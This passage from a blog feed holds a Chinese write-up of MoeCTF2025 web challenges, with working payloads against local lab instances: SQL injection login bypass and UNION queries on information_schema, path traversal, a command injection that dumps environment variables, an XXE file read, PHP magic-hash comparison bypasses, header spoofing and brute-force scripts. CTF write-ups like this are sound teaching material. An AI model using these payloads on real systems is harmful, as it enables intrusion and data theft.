class="language-none">moectf&#123;11738832-155d-3f7a-cc6b-95da7459659d&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;moectf2025_misc_wp&quot;&gt;MoeCTF2025_Misc_wp&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;工具大赛罢了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;</summary>
      
    
    
    
    <category term="笔记" scheme="https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://saintcen.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MoeCTF2025_Web_wp</title>
    <link href="https://saintcen.github.io/2025/10/13/MoeCTF2025_Web_wp/"/>
    <id>https://saintcen.github.io/2025/10/13/MoeCTF2025_Web_wp/</id>
    <published>2025-10-12T16:00:00.000Z</published>
    <updated>2025-10-15T16:43:52.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="moectf2025_web_wp">MoeCTF2025_Web_wp</h1><blockquote><p>不看小说做不出来也无妨</p></blockquote><h2 id="环境配置">环境配置</h2><ul><li><p><strong>浏览器</strong>：<code>Firefox</code></p></li><li><p><strong>工具</strong>：<code>Burpsuite</code><code>Hackbar</code> <code>dirsearch</code> <code>Ant-Sword</code><code>CyberChef</code></p></li><li><p><strong>代码环境</strong>：<code>python</code>/<code>PHP</code>/<code>Javascript</code></p></li></ul><h2 id="web入门指北">0 Web入门指北</h2><blockquote><p>当比赛结束，回顾小说剧情的时候，你会发现主角一路修炼变强的荣耀，不也属于你吗？</p></blockquote><p><code>F12</code>打开控制台输入<code>JSFuck</code>代码即可。</p><pre class="language-none"><code class="language-none">moectf&#123;jv@vScr1p7_14_so0o0o0o_inT3r3&amp;t!!!&#125;</code></pre><h2 id="第一章-神秘的手镯">01 第一章 神秘的手镯</h2><blockquote><p>【万载尘封，灵犀方启。欲窥玄机，需诵‘启封咒’。】</p></blockquote><p>不让复制，只需控制台禁用<code>JS</code>，然后再打开。</p><p><code>Microsoft Edge</code>：<code>Ctrl+Shift+I</code><code>Ctrl+Shift+P</code>，输入<code>JavaScript</code></p><p><code>Firefox</code>：网址栏输入<code>about:config</code>，找到<code>javascript.enabled</code></p><pre class="language-none"><code class="language-none">moectf&#123;f_i2_1s_Your_g00d_fri3nd!!&#125;</code></pre><p><strong>另：查看前端源代码即可发现<code>flag</code></strong></p><h2 id="第一章-神秘的手镯_revenge">01 第一章 神秘的手镯_revenge</h2><blockquote><p>相传，大名鼎鼎的<strong>金曦破妄真君</strong>——HDdss从微末中来，偶然中通过<strong>劫烬重明天尊</strong>——K皇的手镯与其相识并拜K皇为师。后来在K皇帮助HD修行，而HD帮助K皇重塑肉身，二人双双飞升成仙，如今不知去向……</p></blockquote><p>提示备份，我们在<code>URL</code>后添加<code>/wanyanzhou.txt.bak</code>，得到了密码。</p><p>下面只需输入<code>500次</code>，查看一下<code>JS</code>源代码再编写爆破脚本。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token constant">PASSWORD</span><span class="token operator">=</span><span class="token string">"REPLACE_WITH_PASSWORD"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">ITERS</span><span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">;</span><span class="token keyword">const</span> ta<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"passwordInput"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> btn<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"unsealButton"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> desc<span class="token operator">=</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptor</span><span class="token punctuation">(</span><span class="token class-name">HTMLTextAreaElement</span><span class="token punctuation">.</span>prototype<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>ta<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">configurable</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token literal-property property">enumerable</span><span class="token operator">:</span>desc<span class="token punctuation">.</span>enumerable<span class="token punctuation">,</span>  <span class="token function-variable function">get</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> desc<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function-variable function">set</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token operator">===</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token keyword">return</span> desc<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token constant">ITERS</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  ta<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token constant">PASSWORD</span><span class="token punctuation">;</span>  ta<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Event</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">bubbles</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  btn<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token operator">=></span><span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">delete</span> ta<span class="token punctuation">.</span>value<span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>ta<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">,</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;0a7c8efd-86a7-5531-adf0-c673352e474b&#125;</code></pre><h2 id="第二章-初识金曦玄轨">02 第二章 初识金曦玄轨</h2><blockquote><p>“此乃老夫模拟宗门常见的‘天赋初测禁制’所设。”K皇道，“其表象华丽，内藏乾坤。真言（Flag）便藏于其玄轨本源之中。你且运转罗盘，以‘窥天之桥’探查此光幕本源，找出真言！”</p></blockquote><p>提示用<code>8080</code>端口代理。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl -x http://127.0.0.1:8080 http://127.0.0.1:11023/</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"zh"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>金曦禁制·初阶试炼<span class="token operator">&lt;</span>/title<span class="token operator">></span>    <span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"https://fonts.googleapis.com/css2?family=Ma+Shan+Zheng&amp;display=swap"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/static/css/style.css"</span><span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"ink-bg"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"scroll-container"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"scroll-content"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>【金曦禁制·初阶试炼】<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"talisman-card"</span><span class="token operator">></span>                <span class="token operator">&lt;</span>blockquote<span class="token operator">></span>                    <span class="token string">"金曦禁制乃宗门秘传，非神识敏锐者不可窥其真形。"</span>                    <span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span>                    <span class="token operator">&lt;</span>span <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"blur-text"</span><span class="token operator">></span>前往/golden_trail看看<span class="token operator">&lt;</span>/span<span class="token operator">></span>                <span class="token operator">&lt;</span>/blockquote<span class="token operator">></span>            <span class="token operator">&lt;</span>/div<span class="token operator">></span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"spell-code"</span><span class="token operator">></span>                <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"spell-header"</span><span class="token operator">></span>古籍残卷<span class="token operator">&lt;</span>/div<span class="token operator">></span>                <span class="token operator">&lt;</span>p <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"obscured"</span><span class="token operator">></span>此处文字被岁月侵蚀模糊难辨<span class="token punctuation">..</span>.只能辨认几个字<span class="token punctuation">..</span>.破阵<span class="token punctuation">..</span>.盘？<span class="token operator">&lt;</span>/p<span class="token operator">></span>            <span class="token operator">&lt;</span>/div<span class="token operator">></span>        <span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"sword"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"aura-particles"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"/static/js/effects.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p>根据提示，我们前往<code>/golden_trail</code>，查看响应头。</p><p><img src="/2025/10/13/MoeCTF2025_Web_wp/Users\25878\Desktop\Repository\MoeCTF2025_wp\img\web1.png"></p><pre class="language-none"><code class="language-none">moectf&#123;0bs3rv3_Th3_Gold3n_traiL&#125;</code></pre><h2 id="第三章-问剑石篡天改命">03 第三章 问剑石！篡天改命！</h2><blockquote><p>仙门试炼台中央矗立着玄天剑宗至宝”问剑石”，石身流转着七彩霞光。你作为新晋弟子需测试天赋，但暗中知晓问剑石运作的玄机——其天赋判定实则通过金曦玄轨传递信息。</p></blockquote><p><code>bp</code>抓包后按题目要求修改重新<code>post</code>即可。</p><p><img src="/2025/10/13/MoeCTF2025_Web_wp/Users\25878\Desktop\Repository\MoeCTF2025_wp\img\web2.png"></p><pre class="language-none"><code class="language-none">moectf&#123;gEt-P0sT-TR@Nsm15510N_15-@-g00D_meTHoDll!3c&#125;</code></pre><h2 id="第四章-金曦破禁与七绝傀儡阵">04 第四章 金曦破禁与七绝傀儡阵</h2><blockquote><p>眼前景象变换，已身处一座巨大的地下石殿之中。殿内光线昏暗，唯有七尊造型各异、散发着冰冷金属光泽的巨大傀儡，如同沉睡的巨兽，分别矗立在七个方位。空气弥漫着压抑的灵压和机括运转的低沉嗡鸣。</p></blockquote><p>此题考察<code>http</code>请求，完成每个任务后收集玉简拼接。</p><p><strong>GET</strong></p><pre class="language-none"><code class="language-none">?key&#x3D;xdsec # bW9lY3Rme0Mw</code></pre><p><strong>POST</strong></p><pre class="language-none"><code class="language-none">curl -X POST -d &quot;declaration&#x3D;织云阁&#x3D;第一&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;cloud_weaver # bjZyNDd1MTQ3</code></pre><p><strong>本地访问</strong></p><pre class="language-none"><code class="language-none">curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;shadow_stalker # MTBuNV95MHVy</code></pre><p><strong>浏览器</strong></p><pre class="language-none"><code class="language-none">curl -H &quot;User-Agent: moe browser&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;soul_discerner# X2g3N1BfbDN2</code></pre><p><strong>身份认证</strong></p><pre class="language-none"><code class="language-none">curl -H &quot;Cookie: user&#x3D;xt&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;heart_seal# M2xfMTVfcjM0</code></pre><p><strong>Referer</strong></p><pre class="language-none"><code class="language-none">curl -H &quot;Referer: http:&#x2F;&#x2F;panshi&#x2F;entry&quot; http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;pathfinder#  bGx5X2gxOWgh</code></pre><p><strong>PUT</strong></p><pre class="language-none"><code class="language-none">curl -X PUT http:&#x2F;&#x2F;127.0.0.1:53567&#x2F;void_rebirth -H &quot;Content-Type: text&#x2F;plain&quot; -d &quot;新生！&quot;# fQ&#x3D;&#x3D;</code></pre><p><code>base64</code>解码后得到：</p><pre class="language-none"><code class="language-none">moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!&#125;</code></pre><h2 id="第五章-打上门来">05 第五章 打上门来！</h2><blockquote><p>汝不过侥幸得势之鄙夫，安敢窃据S级之位，与吾horrible并列？徒惹人笑！可敢于三日之后，午时三刻，斗法台上一决高下？届时，当众碾碎汝之虚名，令汝知晓何谓云泥之别！——天衍阁·horrible敕令！</p></blockquote><p>可以自由查看网页文件，提示的“文件穿梭技法”即为<code>../</code>，我们输入<code>../../</code>看到了<code>flag</code>文件。</p><pre class="language-none"><code class="language-none">moectf&#123;@ll-1NpuT-ls_M4L1ClOUs4d84c9a3&#125;</code></pre><h2 id="第六章-藏经禁制玄机初探"><strong>06 第六章藏经禁制？玄机初探！</strong></h2><blockquote><p>“九重玄机锁…”K皇沉吟，“此乃’天衍真言术’的入门考验！所谓玄机禁制，实则是以特殊’真言’构筑的规则牢笼——在凡俗界，称之为’数据库’；其破解之道，名为’注入之术’！”</p></blockquote><p>典型的<code>sql</code>注入，用万能密码即可（不过要先查看一下传递的参数）。</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:20322&#x2F;?username&#x3D;&amp;password&#x3D;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39; --</code></pre><pre class="language-none"><code class="language-none">moectf&#123;wEICom3_to_sq1-1NJECTloN!l12a9c353&#125;</code></pre><h2 id="第七章-灵蛛探穴与阴阳双生符">07 第七章 灵蛛探穴与阴阳双生符</h2><blockquote><p>“此乃守阁傀儡布下的警戒网。”K皇提醒，“专捕钻洞宵小。需以’灵蛛探穴术’与其共鸣，方可通过。”</p></blockquote><p>查看<code>/robots.txt</code>，包含爬虫信息。</p><pre class="language-none"><code class="language-none">User-agent: *Disallow: &#x2F;flag.php</code></pre><p>访问<code>flag.php</code>，需要<code>php</code>代码审计。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"b"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></span></code></pre><p>代码中使用的是<code>!=</code>（松散比较），而不是<code>!==</code>（严格比较）。在PHP中，松散比较会进行类型转换。我们可以利用这一点，传递两个字符串，它们不是有效的MD5哈希，但被松散比较认为是相等的。</p><p>构造<code>payload</code>：</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:56727&#x2F;flag.php?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</code></pre><pre class="language-none"><code class="language-none">moectf&#123;md5_IS-not_SAfE1l1d8750fde52&#125;</code></pre><h2 id="第八章-天衍真言星图显圣">08 第八章 天衍真言，星图显圣</h2><blockquote><p>葬星古墟开启前夜，玄机阁底暗流涌动。HDdss以龟息诀化形为顽石，在无相玄光中潜行如影。当他穿过千机岩的密道，眼前的景象令他呼吸一滞——万卷廊并非凡间书阁，而是一片浩瀚星海！十万玉简如星辰流转，在九重天宇间循玄奥轨迹运行。</p></blockquote><p><code>union</code>注入，有固定的做题板子。</p><p>以<code>mysql</code>为例，它有固定的数据库<code>information_schema</code>储存表的信息。</p><p>先确定列数（需要占位）。</p><pre class="language-none"><code class="language-none">&#x2F;?username&#x3D;admin ORDER BY 2 --  &amp;password&#x3D;123</code></pre><p>再查数据库（列数为<code>2</code>）。</p><pre class="language-none"><code class="language-none">&#x2F;?username&#x3D;&#39; union select database(),1 -- &amp;password&#x3D;123</code></pre><p>再查表名（数据库叫<code>user</code>）。</p><pre class="language-none"><code class="language-none">&#x2F;?username&#x3D;&#39; union select (select table_name from information_schema.tables where table_schema&#x3D;&#39;user&#39; limit 0,1),1 -- &amp;password&#x3D;123</code></pre><p>再查字段（表名为<code>flag</code>）。</p><pre class="language-none"><code class="language-none">&#x2F;?username&#x3D;&#39; union select (select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;user&#39; and table_name&#x3D;&#39;users&#39;),1 -- &amp;password&#x3D;123</code></pre><pre class="language-none"><code class="language-none">&#x2F;?username&#x3D;&#39; union select (select value from user.flag),1 -- &amp;password&#x3D;123</code></pre><pre class="language-none"><code class="language-none">moectf&#123;UnlOn-BA5Ed_SqII-fTw1l124520155&#125;</code></pre><h2 id="第九章-星墟禁制天机问路">09 第九章 星墟禁制·天机问路</h2><blockquote><p>【星墟真名关】 虚空星域皆有名，真名隐于天机链。欲入墟眼护重宝，且向玄鉴问幽玄！ ———输入星域真名，解析天机锁链</p></blockquote><p>发现参数中包含<code>URL</code>，尝试下参数注入。</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:62026&#x2F;?url&#x3D;&#39;&#39;;env</code></pre><pre class="language-none"><code class="language-none">moectf&#123;99f51414-4d1b-2df7-66bf-f5cd6765e858&#125;</code></pre><h2 id="第十章-天机符阵">10 第十章 天机符阵</h2><blockquote><p><strong>「星殒禁域·启！」</strong></p></blockquote><p>非预期解，正解在<code>revenge</code>中。</p><p><code>URL</code>后添加<code>/flag.txt</code>即可。</p><pre class="language-none"><code class="language-none">moectf&#123;G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l&#125;</code></pre><h2 id="第十章-天机符阵_revenge">10 第十章 天机符阵_revenge</h2><blockquote><p>flag在flag.txt里面</p></blockquote><p>提示了<code>xxe</code>漏洞。</p><pre class="language-none"><code class="language-none">&lt;阵枢&gt;引魂玉&lt;&#x2F;阵枢&gt;&lt;解析&gt;未定义&lt;&#x2F;解析&gt;&lt;输出&gt;未定义&lt;&#x2F;输出&gt;</code></pre><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">契约</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY xxe SYSTEM "file:///flag.txt"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>阵枢</span><span class="token punctuation">></span></span>引魂玉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>阵枢</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>解析</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>解析</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>输出</span><span class="token punctuation">></span></span>守玉人残魂<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>输出</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;b36161fc-07ae-4cc9-0bda-3673f258ab01&#125;</code></pre><h2 id="第十一章-千机变破妄之眼">11 第十一章 千机变·破妄之眼</h2><blockquote><p>HDdss看到了 <strong>GET</strong>参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入。</p></blockquote><p>查看一下源代码，我们直接在控制台按提示要求爆破。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">permutations</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> n <span class="token operator">=</span> arr<span class="token punctuation">.</span>length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">yield</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token function">permutations</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">[</span>arr<span class="token punctuation">[</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>arr<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">bruteForce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> targetUrl <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>origin <span class="token operator">+</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> param <span class="token keyword">of</span> <span class="token function">permutations</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> paramStr <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>targetUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>paramStr<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>paramStr<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>      <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'X-Requested-With'</span><span class="token operator">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">bruteForce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>发现<code>flag.php</code>，说<code>flag</code>就在这里。还有一个<code>find.php</code>文件，尝试下文件包含。</p><pre class="language-none"><code 